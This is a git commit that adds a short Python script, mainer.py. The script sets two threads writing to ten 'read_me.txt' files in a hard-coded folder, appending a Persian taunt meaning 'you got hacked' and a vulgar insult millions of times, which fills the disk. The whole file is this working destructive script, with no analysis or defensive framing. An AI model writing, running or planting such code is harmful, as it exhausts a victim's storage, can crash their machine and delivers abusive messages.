fa6e4b58c5cdaf302a214efb1a1428121d1020e0
hackir-godrat <95535445+hackir-godrat@users.noreply.github.com>
2022-01-29 12:59:24 +0530

    Add files via upload

---
+++ mainer.py
@@ -0,0 +1,24 @@
+import os
+import threading
+def txt():
+    try:
+        os.chdir('C:\\Users\\Mehdi\\Desktop\\api\\r\\build')
+    except:
+        pass
+    for u in range(10):
+        a = open(str(u) + "read_me.txt", 'a')
+        for i in range(50000):
+            a.write("\nhack shodi\nhack kos nanat"*5000)
+
+def txt2():
+    try:
+        os.chdir('C:\\Users\\Mehdi\\Desktop\\api\\r\\build')
+    except:
+        pass
+    for u in range(10):
+        a = open(str(u) + "read_me.txt", 'a')
+        for i in range(50000):
+            a.write("\nhack shodi\nhack kos nanat" * 5000)
+
+threading.Thread(target=txt).start()
+threading.Thread(target=txt2).start()
